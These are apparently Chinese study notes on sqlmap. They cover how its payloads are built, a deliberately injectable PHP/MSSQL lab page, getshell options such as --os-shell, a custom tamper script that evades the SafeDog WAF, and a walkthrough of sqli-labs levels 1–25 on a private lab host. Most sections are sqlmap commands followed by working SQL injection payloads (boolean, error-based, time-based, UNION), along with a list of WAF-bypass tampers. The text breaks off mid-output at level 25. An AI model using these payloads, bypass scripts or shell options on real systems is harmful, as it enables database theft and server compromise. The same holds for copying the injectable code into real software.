sqlmap在调用payload的时候，首先会调用payload文件夹下的文件中的相应部分，接着在根据test 标签在的`where`和`clause`决定怎么对payload进行前后拼接





sqlmap的payload在目录的`/xml`文件夹中，其关键是payload的文件夹中的六个文件和`boundaries.xml`文件





> 大致流程如下：
>
> ```
> 获取payload.xml文件中的每一个payload。
> 获取boundary.xml文件中的每一个boundary。
> 比较判断payload中的clause是否包含在boundary的clause中，如果有就继续，如果没有就直接跳出。
> 比较判断payload中的where是否包含在boundary的clause中，如果有就继续，如果没有就直接跳出。
> 将prefix和suffix与payload中的request标签的内容拼接起来保存到boundpayload中。
> 最后就是发送请求，然后将结果进行比较了。
> ```



## union注入

> ![t01c7dd683b03f35dba.png (assets/t01c7dd683b03f35dba-1589880575533.png)](assets/t01c7dd683b03f35dba.png)





## error-based注入

> ![t017a9a1ae545be7b6a.png (assets/t017a9a1ae545be7b6a-1589880624292.png)](assets/t017a9a1ae545be7b6a.png)



## boolean注入

> ![t01288e6e995fc8a408.png (assets/t01288e6e995fc8a408-1589880758318.png)](assets/t01288e6e995fc8a408.png)



## Time-based注入

> ![t01cec7b35b298cb13b.png (assets/t01cec7b35b298cb13b-1589880714802.png)](assets/t01cec7b35b298cb13b.png)

# Sqlmap高级使用

1. [记一份SQLmap使用手册小结（二）](https://xz.aliyun.com/t/3011)
2. [sqlmap关于MSSQL执行命令研究](https://mp.weixin.qq.com/s/U1MaRyNJjiX4yxZt1TW4TA)
3. [sqlmap Getshell 让你离shell更近一步 --os-shell](https://zhuanlan.zhihu.com/p/58007573)
4. [SQLMAP --os-shell 学习](https://www.sec-note.com/2018/03/26/sqlmap_os_shell/)



## 0x00 环境搭建

环境说明：

- Windows 2003 + MSSQL + PHP5.2.17 (注意刷新缓存 --flush-session)
- 关闭GPC
- 构造SQL注入：

参考链接：
- [Windows 2003利用IIS 6.0搭建ASP+SqlServer网站环境](https://www.jianshu.com/p/5e6c50b6cf6d)



可以下载mssql 2005版本，使用时出现连接不上的问题：

- [SQL Server Management Studio连不上数据库设置方法](https://blog.csdn.net/weixin_40706090/article/details/78752620)








```php
<?php
$id = $_GET['id'];
$con = mssql_connect('127.0.0.1','sa','server2005');
if(!$con){
echo "Erroe";
}
else{
echo "Connect OK.</br>";
}
mssql_select_db('sqlmap_test');
# $sql = "exec master..xp_cmdshell 'whoami'";

$sql = "select id,name from admin where id=".$id;

$result = mssql_query($sql);
/* $row = mssql_fetch_array($result);
echo $row[0]; */

while($list=mssql_fetch_array($result))
{
   print_r($list);
   echo "<br>";
}
}
```





## 0x01 测试sqlmap命令

```sh
--os-shell
--sql-shell
--os-pwn
--os-smbrelay
--os-bof
--reg-[read/add/del]
```



**sqlmap getshell的条件**：

- 拥有数据库dba权限为True
- 知道网站的绝对路径
- PHP关闭魔术引号
- secure_file_priv= 值为空







# Sqlmap Tamper编写

- [如何编写Sqlmap的Tamper脚本?](https://payloads.online/archivers/2017-06-08/1)



> 示例：

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW

def tamper(payload):
    if payload:
        bypass_SafeDog_str = "/*x^x*/"
        payload=payload.replace("UNION",bypass_SafeDog_str+"UNION"+bypass_SafeDog_str)
        payload=payload.replace("SELECT",bypass_SafeDog_str+"SELECT"+bypass_SafeDog_str)
        payload=payload.replace("AND",bypass_SafeDog_str+"AND"+bypass_SafeDog_str)
        payload=payload.replace("=",bypass_SafeDog_str+"="+bypass_SafeDog_str)
        payload=payload.replace(" ",bypass_SafeDog_str)
        payload=payload.replace("information_schema.","%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/")
        payload=payload.replace("FROM",bypass_SafeDog_str+"FROM"+bypass_SafeDog_str)
        #print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."
        # print(payload)
    return payload
```











# Sqlmap、脚本解决sqli-labs

### less1

```sh
sqlmap -u http://192.168.133.162/sql/Less-1/index.php?id=1 --batch --dbs
```



### less2

```sh
sqlmap -u http://192.168.133.162/sql/Less-2/index.php?id=1 --batch --dbs
```



### less3

```sh
sqlmap -u http://192.168.133.162/sql/Less-3/index.php?id=1 --batch --dbs
```



### less4

```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```



### less5

```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：报错注入，时间盲注

```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 223 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9191=9191 AND 'tjNq'='tjNq

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 5307 FROM(SELECT COUNT(*),CONCAT(0x716a787871,(SELECT (ELT(5307=5307,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'lDyx'='lDyx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7383 FROM (SELECT(SLEEP(5)))QnIP) AND 'rsQQ'='rsQQ

```



### less6



```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入、报错注入，时间盲注



```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 207 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: id=1" AND 5041=5041#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1" AND (SELECT 3226 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(3226=3226,1))),0x717a6b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zVCx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1" AND (SELECT 5756 FROM (SELECT(SLEEP(5)))oBoe)-- dZNC
---

```







### less7





```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入，时间盲注



```sh
sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1') AND 9250=9250 AND ('AWTH'='AWTH

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1') AND (SELECT 4903 FROM (SELECT(SLEEP(5)))eIgu) AND ('VQKm'='VQKm
---

```



###  less8



```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入，时间盲注



```sh
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3254=3254 AND 'Eznz'='Eznz

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 2673 FROM (SELECT(SLEEP(5)))noGG) AND 'TnYF'='TnYF
---

```





### less9



```sh
sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs
```

利用：二分注入，时间盲注

```sh
sqlmap identified the following injection point(s) with a total of 243 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 6338=6338 AND 'zGGA'='zGGA

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7400 FROM (SELECT(SLEEP(5)))lmWZ) AND 'pdvI'='pdvI
---

```



### less10

从10开始之前的payload不奏效了。

从天书里看出只是换成了双引号，其实很简单，所以这里用到之前学到的prefix的方法



```sh
sqlmap -u http://192.168.133.162/sql/Less-10/index.php?id=1 -p id --prefix "\""  --batch --dbs
```

二分注入、时间注入

```sh
sqlmap identified the following injection point(s) with a total of 798 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1" AND 4154=4154-- CDvk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1" AND (SELECT 9271 FROM (SELECT(SLEEP(5)))fjSc)-- pRRC
---

```



### less11

11是post注入

很简单，自动提交表单即可

```sh
sqlmap -u http://192.168.133.162/sql/Less-11/index.php --forms --dbs 
```



二分注入、报错注入、时间盲注、union注入

```sh
sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uname=HHNh' OR NOT 8084=8084#&passwd=&submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=HHNh' OR (SELECT 1351 FROM(SELECT COUNT(*),CONCAT(0x7176717171,(SELECT (ELT(1351=1351,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zuew&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=HHNh' AND (SELECT 8246 FROM (SELECT(SLEEP(5)))ctEF)-- Ezsb&passwd=&submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: uname=HHNh' UNION ALL SELECT CONCAT(0x7176717171,0x79456e586f4161764e7250446e485a67586e4a544e79484c756d6a4544536a717a5449576954656d,0x7170716b71),NULL#&passwd=&submit=Submit
---

```



### less12

与less1相同的payload

```sh
sqlmap -u http://192.168.133.162/sql/Less-12/index.php --forms --dbs 
```

报错、bool、时间、union都可以

```sh
sqlmap identified the following injection point(s) with a total of 134 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: uname=hfRw") OR NOT 1620=1620#&passwd=&submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: uname=hfRw") AND EXTRACTVALUE(1777,CONCAT(0x5c,0x7178717171,(SELECT (ELT(1777=1777,1))),0x7171787a71)) AND ("FDGb"="FDGb&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=hfRw") AND (SELECT 6736 FROM (SELECT(SLEEP(5)))stfK) AND ("rnrd"="rnrd&passwd=&submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: uname=hfRw") UNION ALL SELECT CONCAT(0x7178717171,0x655955517a486b7555414f47504a745979774842526d654a524a78516348664142695048464e6665,0x7171787a71),NULL#&passwd=&submit=Submit
---

```







### less13

payload不变：

```sh
 sqlmap -u http://192.168.133.162/sql/Less-13/index.php --forms --dbs --batch
```

但是速度有点慢，可以参考之前的优化设置，也可以直接指定使用的注入方法--thread 10 --batch



可以看出是加上了 ')

```sh
sqlmap identified the following injection point(s) with a total of 1226 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=nosa') OR (SELECT 9280 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(9280=9280,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jgQP&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=nosa') AND (SELECT 9185 FROM (SELECT(SLEEP(5)))QrLC)-- twvv&passwd=&submit=Submit
---

```





### less14

```sh
sqlmap -u http://192.168.133.162/sql/Less-14/index.php --forms --dbs --thread 10 --batch
```



双引号

```sh
sqlmap identified the following injection point(s) with a total of 1225 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=gVWd" OR (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a6a6b71,(SELECT (ELT(7011=7011,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EcVM&passwd=&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=gVWd" AND (SELECT 2546 FROM (SELECT(SLEEP(5)))meQb)-- cASj&passwd=&submit=Submit
---

```





### less15

```sh
sqlmap -u http://192.168.133.162/sql/Less-15/index.php --forms --dbs --thread 10 --batch
```

只能时间盲注，稍慢一点

```sh
sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=gtNL' AND (SELECT 4937 FROM (SELECT(SLEEP(5)))rzUm) AND 'KyvN'='KyvN&passwd=&submit=Submit
---

```





### less16

出现了无法注入的情况。看天书说是")

所以添加前缀

```sh
sqlmap -u http://192.168.133.162/sql/Less-16/index.php --forms --dbs --thread 10 --prefix "\")"  --batch
```



```sh
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=JQyQ") AND (SELECT 3582 FROM (SELECT(SLEEP(5)))vtUP)-- bCkY&passwd=&submit=Submit
---

```





### less17

第17关对uname参数有checkinput保护，如果不想绕过uname的话，注入点其实在passwd。



但是由于uname是一个确定的用户才能更新数据，所以这里不能自动填写表单了

```sh
sqlmap -u http://192.168.133.162/sql/Less-17/index.php --data "uname=admin&passwd=&submit=Submit" --dbs --thread 10  --prefix "'" -p passwd --batch
```

报错注入、时间注入

```sh
sqlmap identified the following injection point(s) with a total of 1880 HTTP(s) requests:
---
Parameter: passwd (POST)
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin&passwd=' OR (SELECT 4589 FROM(SELECT COUNT(*),CONCAT(0x7178706b71,(SELECT (ELT(4589=4589,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hurJ&submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: uname=admin&passwd=' OR (SELECT 8521 FROM (SELECT(SLEEP(5)))AJtH)-- HnnG&submit=Submit
---

```



如果绕过转义，这里主要是绕过mysql_real_escape_string后再次加上单引号的限制， 暂时不知道如何进行绕过



### less18

这一关是user-agent注入

> sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。

例如： -p "id,user-agent"



想要执行到注入点需要提供正确的uname和passwd

```sh
sqlmap -u http://192.168.133.162/sql/Less-18/index.php --data "uname=admin&passwd=admin&submit=Submit" --dbs --thread 10  -p "user-agent"  --batch
```

![image-20200517191226342](assets/image-20200517191226342.png)



sqlmap发包默认如图，可以使用random-agent参数或者直接--user-agent参数指定。

可以使用报错注入和时间盲注。

```sh
sqlmap identified the following injection point(s) with a total of 1582 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: sqlmap/1.4#stable (http://sqlmap.org)' AND EXTRACTVALUE(8499,CONCAT(0x5c,0x71626a7171,(SELECT (ELT(8499=8499,1))),0x7170717871)) AND 'anbC'='anbC

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: sqlmap/1.4#stable (http://sqlmap.org)' RLIKE SLEEP(5) AND 'bpJy'='bpJy
---

```



### less19

与18关类似，这一关是考察referer字段

```sh
sqlmap -u http://192.168.133.162/sql/Less-19/index.php --data "uname=admin&passwd=admin&submit=Submit" --dbs --thread 10  -p "referer"  --batch
```



```sh
sqlmap identified the following injection point(s) with a total of 413 HTTP(s) requests:
---
Parameter: Referer (Referer)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://192.168.133.162:80/sql/Less-19/index.php' RLIKE (SELECT (CASE WHEN (1980=1980) THEN 0x687474703a2f2f3139322e3136382e3133332e3136323a38302f73716c2f4c6573732d31392f696e6465782e706870 ELSE 0x28 END)) AND 'ARWO'='ARWO

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: http://192.168.133.162:80/sql/Less-19/index.php' AND EXTRACTVALUE(8119,CONCAT(0x5c,0x71766b6b71,(SELECT (ELT(8119=8119,1))),0x7162707671)) AND 'nKgQ'='nKgQ

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: http://192.168.133.162:80/sql/Less-19/index.php' RLIKE SLEEP(5) AND 'FSNZ'='FSNZ
---

```





### less20



我们需要在cookie中带上uname字段。并且不需要有submit字段，测试cookie只需要level2即可

```sh
sqlmap -u http://192.168.133.162/sql/Less-20/index.php --cookie="uname=admin" --dbs --thread 10 --level 2  --batch 
```



```sh
Cookie parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin' AND 6687=6687 AND 'KySP'='KySP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin' AND (SELECT 4501 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(4501=4501,1))),0x716b767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'AXTs'='AXTs

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 4107 FROM (SELECT(SLEEP(5)))MHaz) AND 'sLBD'='sLBD

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: uname=-2840' UNION ALL SELECT CONCAT(0x7178787071,0x4d466f624d544e746e5669714a4e5a4b76686e6c7042487153507763574256777855626f58717868,0x716b767671),NULL,NULL-- AKIY
---

```



### less21

这一关对cookie中的uname字段进行了base64编码

可以使用sqlmap  --list-tampers 查看所有tampers，和base64编码相关的是base64encode.py

```sh
* apostrophemask.py - Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)
* apostrophenullencode.py - Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
* appendnullbyte.py - Appends (Access) NULL byte character (%00) at the end of payload
* base64encode.py - Base64-encodes all characters in a given payload
* between.py - Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'
* bluecoat.py - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character '=' with operator LIKE
* chardoubleencode.py - Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %2553%2545%254C%2545%2543%2554)
* charencode.py - URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54)
* charunicodeencode.py - Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)
* charunicodeescape.py - Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \u0053\u0045\u004C\u0045\u0043\u0054)
* commalesslimit.py - Replaces (MySQL) instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' counterpart
* commalessmid.py - Replaces (MySQL) instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' counterpart
* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -> /**/()
* concat2concatws.py - Replaces (MySQL) instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' counterpart
* equaltolike.py - Replaces all occurrences of operator equal ('=') with 'LIKE' counterpart
* escapequotes.py - Slash escape single and double quotes (e.g. ' -> \')
* greatest.py - Replaces greater than operator ('>') with 'GREATEST' counterpart
* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword
* hex2char.py - Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),...) counterpart
* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;)
* ifnull2casewhenisnull.py - Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart
* ifnull2ifisnull.py - Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' counterpart
* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier
* least.py - Replaces greater than operator ('>') with 'LEAST' counterpart
* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -> select)
* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)
* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment
* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment
* multiplespaces.py - Adds multiple spaces (' ') around SQL keywords
* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)
* overlongutf8more.py - Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
* percentage.py - Adds a percentage sign ('%') infront of each character (e.g. SELECT -> %S%E%L%E%C%T)
* plus2concat.py - Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart
* plus2fnconcat.py - Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart
* randomcase.py - Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
* randomcomments.py - Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
* sp_password.py - Appends (MsSQL) function 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
* space2comment.py - Replaces space character (' ') with comments '/**/'
* space2dash.py - Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
* space2hash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
* space2morecomment.py - Replaces (MySQL) instances of space character (' ') with comments '/**_**/'
* space2morehash.py - Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
* space2mssqlblank.py - Replaces (MsSQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
* space2mssqlhash.py - Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
* space2mysqlblank.py - Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters
* space2mysqldash.py - Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
* space2plus.py - Replaces space character (' ') with plus ('+')
* space2randomblank.py - Replaces space character (' ') with a random blank character from a valid set of alternate characters
* substring2leftright.py - Replaces PostgreSQL SUBSTRING with LEFT and RIGHT
* symboliclogical.py - Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
* unionalltounion.py - Replaces instances of UNION ALL SELECT with UNION SELECT counterpart
* unmagicquotes.py - Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)
* uppercase.py - Replaces each keyword character with upper case value (e.g. select -> SELECT)
* varnish.py - Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall
* versionedkeywords.py - Encloses each non-function keyword with (MySQL) versioned comment
* versionedmorekeywords.py - Encloses each keyword with (MySQL) versioned comment
* xforwardedfor.py - Append a fake HTTP header 'X-Forwarded-For' (and alike)
[07:50:31] [WARNING] you haven't updated sqlmap for more than 136 days!!!
```




```sh
sqlmap -u http://192.168.133.162/sql/Less-21/index.php --cookie="uname=admin" --dbs --thread 10 --level 2  --tamper "base64encode.py" --batch
```





报错注入、时间盲注、bool盲注

```sh
Cookie parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin') AND 5369=5369 AND ('iQxR' LIKE 'iQxR

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin') AND (SELECT 7756 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT (ELT(7756=7756,1))),0x71717a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('XAYM' LIKE 'XAYM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin') AND (SELECT 4840 FROM (SELECT(SLEEP(5)))xHLI) AND ('NCtt' LIKE 'NCtt

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: uname=-1690') UNION ALL SELECT 7354,7354,CONCAT(0x71626b7071,0x436d455544674777774e596b4d736d666d41514e784369594447524264716e6f6b4f444e52657454,0x71717a7871)#
---

```



### less22

与上一关没有太大区别，payload一致

```sh
sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin" AND 2420=2420 AND "oiis"="oiis

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin" AND (SELECT 3162 FROM(SELECT COUNT(*),CONCAT(0x7176766a71,(SELECT (ELT(3162=3162,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "KDER"="KDER

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin" AND (SELECT 3871 FROM (SELECT(SLEEP(5)))FnVE) AND "GAqW"="GAqW

    Type: UNION query
    Title: MySQL UNION query (random number) - 3 columns
    Payload: uname=-9694" UNION ALL SELECT CONCAT(0x7176766a71,0x534b4a6c6748675549714b5253726363584546487753484c4a6a584c7745506b736d5461417a5072,0x7171787871),2413,2413#
---

```



### less23

从less23开始加入一些过滤，这里可以使用内置tamper或者自己编写的tamper进行绕过，这一关只是过滤了注释符，闭合是可以的

```sh
sqlmap -u http://192.168.133.162/sql/Less-23/index.php?id=1  --dbs --thread 10 --batch
```

```sh
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4202=4202 AND 'oxkU'='oxkU

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 1312 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(1312=1312,1))),0x7170627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CjmC'='CjmC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6430 FROM (SELECT(SLEEP(5)))EFyw) AND 'hGlI'='hGlI
---
```





### less24

24关为二次注入绕过登录限制。这里暂时不用sqlmap了

关于sqlmap和自定义tamper利用二次注入的大神文章也有：

- [使用Burp和自定义Sqlmap Tamper利用二次注入漏洞](https://www.freebuf.com/articles/web/142963.html)
- [记一份SQLmap使用手册小结（一）](https://xz.aliyun.com/t/3010)



或者使用sqlmap 的二次注入功能

参数：`–second-order`

有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。

`–second-order`后面跟一个判断页面的URL地址。





### less25

这一关主要是绕过or 和 and 过滤，替换方法有如下：
- （1）大小写变形 Or,OR,oR 
- （2）编码，hex，urlencode 
- （3）添加注释/*or*/ 
- （4）利用符号 and=&& or=||

sqlmap 对于or和and 替换成 && 与 || 有内置tamper symboliclogical.py

没有加tamper时，显示无法注入

加上之后，可以成功，但是并没有返回所有数据库，显示在查询数据库数量的时候出现错误

```sh
sqlmap -u http://192.168.133.162/sql/Less-25/index.php?id=1  --dbs --thread 10 --batch --tamper "symboliclogical.py"
```


```sh
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2505=2505 AND 'XqwA'='XqwA

    Type: error-based
